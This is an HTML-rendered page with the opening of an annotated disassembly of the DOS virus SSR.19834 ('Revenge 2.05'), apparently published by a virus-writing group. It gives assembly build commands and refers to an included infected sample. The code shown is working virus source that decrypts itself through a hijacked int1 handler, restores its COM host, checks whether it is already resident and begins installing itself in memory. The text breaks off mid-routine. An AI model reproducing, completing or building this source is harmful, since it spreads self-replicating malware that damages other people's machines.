<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.SSR.19834 - ssr.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;                            ³     SSR.19834     ³</span><span class="sc0">
</span><span class="sc1">;                            ³  or Revenge 2.05  ³</span><span class="sc0">
</span><span class="sc1">;                            ³  Disassembled by  ³</span><span class="sc0">
</span><span class="sc1">;                            ³      Tcp/29A      ³</span><span class="sc0">
</span><span class="sc1">;                            ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is one of the biggest known  viruses and probably  the most encrypted</span><span class="sc0">
</span><span class="sc1">; one: four different polymorphic decryption bucles. Only these bucles waste</span><span class="sc0">
</span><span class="sc1">; more than 7k of code. About the virus itself, it has many interesting fea-</span><span class="sc0">
</span><span class="sc1">; tures, it was coded in a pretty uncommon way tho... there's code not used,</span><span class="sc0">
</span><span class="sc1">; it's not optimized, and has a lot of messages, apparently (i can't unders-</span><span class="sc0">
</span><span class="sc1">; tand russian :) messing with some AVers. This virus seems to be an attempt</span><span class="sc0">
</span><span class="sc1">; to laugh about the deficiencies of some antiviruses (and exploit them) ra-</span><span class="sc0">
</span><span class="sc1">; ther than writing a virus itself. By the end of the viral code, appear 921</span><span class="sc0">
</span><span class="sc1">; bytes i didn't include in the  disassembly as they have nothing to do with</span><span class="sc0">
</span><span class="sc1">; the virus, albeit they will be added to every infected file. I guess these</span><span class="sc0">
</span><span class="sc1">; bytes being copied are due to the fact that SSR left enough room for its 3</span><span class="sc0">
</span><span class="sc1">; engines and eventually forgot to readjust the size. The binary file inclu-</span><span class="sc0">
</span><span class="sc1">; ded in the \FILES directory is infected with an original copy of the virus</span><span class="sc0">
</span><span class="sc1">; and not with what you can get from the assembly of this file (because this</span><span class="sc0">
</span><span class="sc1">; source does not include the last 921 bytes of trash code).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The code is commented enough so there's  nothing else to say... if anybody</span><span class="sc0">
</span><span class="sc1">; wants to read something more about the functioning of this virus, i recom-</span><span class="sc0">
</span><span class="sc1">; mend to have a look to what AVPVE says about previous versions of this vi-</span><span class="sc0">
</span><span class="sc1">; rus (there are some errors in the description tho).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Other data</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Virus     : Revenge 2.05 (aka SSR.19834)</span><span class="sc0">
</span><span class="sc1">; Size      : 19834 (11645 code+engines; 5000+1500+768 decryptors; 921 shit)</span><span class="sc0">
</span><span class="sc1">; Author    : Stainless Steel Rat</span><span class="sc0">
</span><span class="sc1">; Origin    : Russia</span><span class="sc0">
</span><span class="sc1">; Disasm by : Tcp/29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Send any question or comment to tcp@cryogen.com.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling it</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Engines:</span><span class="sc0">
</span><span class="sc1">;  tasm /m res.asm</span><span class="sc0">
</span><span class="sc1">;  tasm /m ssrme.asm</span><span class="sc0">
</span><span class="sc1">;  tasm /m mme.asm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus:</span><span class="sc0">
</span><span class="sc1">;  tasm /m ssr.asm</span><span class="sc0">
</span><span class="sc1">;  tlink ssr res ssrme mme</span><span class="sc0">
</span><span class="sc1">;  exe2bin ssr ssr.com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - -[SSR.ASM]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8</span><span class="sc0">
                </span><span class="sc5">SSR</span><span class="sc0">     </span><span class="sc9">segment</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">SSR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">SSR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">SSR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">SSR</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RES_DEC</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">768</span><span class="sc0">
</span><span class="sc5">SSRME_DEC</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5000</span><span class="sc0">
</span><span class="sc5">MME_DEC</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1500</span><span class="sc0">
</span><span class="sc5">DECRYPTORS</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">RES_DEC</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SSRME_DEC</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">MME_DEC</span><span class="sc0">

</span><span class="sc5">SHIT_AT_END</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">921</span><span class="sc0">

</span><span class="sc5">SSR_SIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">RES_SIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">911</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">SSRME_SIZE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">1507</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">)*</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">MME_SIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1133</span><span class="sc0">

</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">SSR_SIZE</span><span class="sc4">+</span><span class="sc5">RES_SIZE</span><span class="sc4">+</span><span class="sc5">SSRME_SIZE</span><span class="sc4">+</span><span class="sc5">MME_SIZE</span><span class="sc4">+</span><span class="sc5">DECRYPTORS</span><span class="sc4">+</span><span class="sc5">SHIT_AT_END</span><span class="sc0">
</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">VIRUS_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DECRYPTORS</span><span class="sc0">

</span><span class="sc5">host</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc1">; Infected host</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">                            </span><span class="sc1">; Virus starts here</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_instruction</span><span class="sc0">
</span><span class="sc5">next_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_delta</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0"> 

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Hi Hacker! Welcome to Hell'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Hi SSR! ;)</span><span class="sc0">

</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">next_instruction</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUSCODE_SIZE</span><span class="sc4">-(</span><span class="sc5">decrypted_code</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">decrypted_code</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_int1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Read &amp; save int1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_int1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">int1_decryptor</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; Set new int1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; AH:=xxx0</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">                      </span><span class="sc1">; AH:=xxx1 (trace flag on)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">starting_dec_selector</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">dec_selector</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">i1_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">                            </span><span class="sc1">; Trace flag on</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0">                       </span><span class="sc1">; Decrypt code via int1</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">decrypted_code</span><span class="sc0">

</span><span class="sc5">int1_decryptor</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; All code decrypted?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">restore_i1</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_dec_inst</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">encrypt_decrypt</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">decrypt_instruction</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">      </span><span class="sc1">; Select instruction from table</span><span class="sc0">
</span><span class="sc5">encrypt_decrypt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">; NOP for decryption</span><span class="sc0">
                                        </span><span class="sc1">; RET for encryption</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">    

</span><span class="sc5">restore_i1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_int1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Restore original int1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">seg_int1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">i1_mask</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">starting_dec_selector</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ofs_int1</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">seg_int1</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">select_dec_inst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">decryption_instructions</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">decrypt_instruction</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">dec_selector</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">dec_selector</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; Select instruction</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_instruction</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc5">copy_instruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dec_selector</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">decryption_instructions</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">decrypted_code</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">host_type</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Exe file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">host_exe</span><span class="sc0">                </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">header</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">e_header_exe</span><span class="sc4">-</span><span class="sc5">header_exe</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Restore host (COM)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">host_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ES:=0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">198h</span><span class="sc4">],</span><span class="sc2">0DEADh</span><span class="sc0">    </span><span class="sc1">; Resident?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">install_virus</span><span class="sc0">           </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_exec_host</span><span class="sc0">

</span><span class="sc5">install_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; ES:=0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">30h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get int 21h segment (CP/M)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">realseg_i2f</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store for tunneling int 2Fh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Offset int 1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">ofs_i1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Store it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">1h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Segment int 1</span><span class="sc0">
